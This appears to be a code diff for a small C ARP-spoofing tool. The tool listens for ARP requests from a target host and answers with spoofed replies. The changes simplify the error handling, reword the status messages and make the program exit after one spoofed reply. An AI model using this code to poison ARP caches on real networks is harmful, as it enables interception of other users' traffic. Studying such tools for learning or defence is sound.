@@ -70,12 +70,7 @@ void listen_for_arp(t_env *env)
     {
         int packet = recvfrom(env->sock_fd, buffer, BUFFER_SIZE, 0, &saddr, &saddr_len);
         if (packet < 0)
-        {
-            if (errno == EAGAIN || errno == EAGAIN)
-                continue;
-            else
-                return;
-        }
+            return;
         struct ethhdr *eth = (struct ethhdr *)buffer;
         if (ntohs(eth->h_proto) == ETH_P_ARP)
         {
@@ -84,7 +79,7 @@ void listen_for_arp(t_env *env)
                 if (ft_memcmp(arp_req->sender_ip, &env->target_ip->sin_addr.s_addr, 4) == 0 &&
                     ft_memcmp(arp_req->target_ip, &env->source_ip->sin_addr.s_addr, 4) == 0)
                 {
-                    printf("An ARP request has been brodcast\n");
+                    printf("An ARP request has been brodcast, sending an reply to the target address, please wait...\n");
                     print_packet(env->ver, arp_req, buffer);
                     send_arp(env, arp_req);
                 }
@@ -160,5 +155,9 @@ void send_arp(t_env *env, struct arp_header *arp_req)
     if (sendto(env->sock_fd, &packet, sizeof(packet), 0, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0)
         dprintf(2, "Failed to send ARP request %d!\n", errno);
     else
-        printf("Sent spoofed reply to %s, check ARP table\n", inet_ntoa(*(struct in_addr *)arp_req->sender_ip));
+    {
+        printf("Sent spoofed reply to %s, check ARP table.\nExiting program...\n", inet_ntoa(*(struct in_addr *)arp_req->sender_ip));
+        errno = 1;
+        return;
+    }
 }
